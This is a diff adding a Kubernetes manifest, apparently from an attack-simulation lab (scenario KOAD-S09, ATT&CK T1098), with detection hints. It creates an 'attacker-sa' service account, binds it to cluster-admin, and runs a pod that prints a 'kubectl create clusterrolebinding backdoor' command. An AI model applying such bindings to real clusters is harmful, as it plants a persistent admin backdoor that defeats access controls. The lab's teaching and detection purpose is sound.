@@ -1,0 +1,56 @@
+# KOAD-S09: RBAC Manipulation
+# ATT&CK: T1098 — Account Manipulation
+# Attack: Create ClusterRoleBinding to grant attacker SA cluster-admin
+---
+apiVersion: v1
+kind: ServiceAccount
+metadata:
+  name: attacker-sa
+  namespace: koad
+  labels:
+    koad-scenario: S09
+    mitre-attck: T1098
+---
+apiVersion: rbac.authorization.k8s.io/v1
+kind: ClusterRoleBinding
+metadata:
+  name: koad-attacker-admin
+  labels:
+    koad-scenario: S09
+    mitre-attck: T1098
+  annotations:
+    description: "Attacker-created binding — escalates attacker-sa to cluster-admin"
+subjects:
+  - kind: ServiceAccount
+    name: attacker-sa
+    namespace: koad
+roleRef:
+  kind: ClusterRole
+  name: cluster-admin
+  apiGroup: rbac.authorization.k8s.io
+---
+apiVersion: v1
+kind: Pod
+metadata:
+  name: rbac-manipulator
+  namespace: koad
+  labels:
+    koad-scenario: S09
+spec:
+  serviceAccountName: overprivileged-sa
+  containers:
+    - name: manipulator
+      image: bitnami/kubectl:latest
+      command: ["sh", "-c"]
+      args:
+        - |
+          echo "=== KOAD-S09: RBAC Manipulation ==="
+          echo "Demo: Creating a new ClusterRoleBinding"
+          echo ""
+          echo "Attack commands:"
+          echo "  kubectl create clusterrolebinding backdoor --clusterrole=cluster-admin --serviceaccount=koad:attacker-sa"
+          echo "  kubectl get clusterrolebindings -l koad-scenario=S09"
+          echo ""
+          echo "Detection:"
+          echo "  Watch for audit log entries: verb=create resource=clusterrolebindings"
+          sleep infinity
